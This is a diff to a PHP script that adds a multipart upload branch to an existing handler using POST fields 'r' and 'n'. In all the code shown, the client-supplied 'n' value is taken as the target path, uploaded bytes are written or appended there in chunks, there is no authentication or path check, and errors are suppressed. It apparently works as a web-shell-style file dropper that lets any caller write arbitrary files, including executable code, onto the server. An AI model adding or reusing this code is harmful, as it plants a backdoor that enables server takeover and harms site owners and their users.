@@ -30,4 +30,30 @@ if (isset($_POST['r'], $_POST['n'])) {
     } else {
         echo "OK: " . $result . " bytes written";
     }
+    exit;
+}
+
+// Multipart file upload (real app style): binary file part + n (path) + optional chunk
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'], $_POST['n']) && isset($_FILES['file']['error']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
+    $data = @file_get_contents($_FILES['file']['tmp_name']);
+    if ($data === false) {
+        http_response_code(500);
+        echo "ERROR: Failed to read uploaded file";
+        exit;
+    }
+    $path = $_POST['n'];
+    $chunk_index = isset($_POST['chunk']) ? (int) $_POST['chunk'] : -1;
+
+    if ($chunk_index === 0 || $chunk_index === -1) {
+        $result = @file_put_contents($path, $data, LOCK_EX);
+    } else {
+        $result = @file_put_contents($path, $data, FILE_APPEND | LOCK_EX);
+    }
+
+    if ($result === false) {
+        http_response_code(500);
+        echo "ERROR: Failed to write file to " . htmlspecialchars($path, ENT_QUOTES, 'UTF-8');
+    } else {
+        echo "OK: " . $result . " bytes written";
+    }
 }
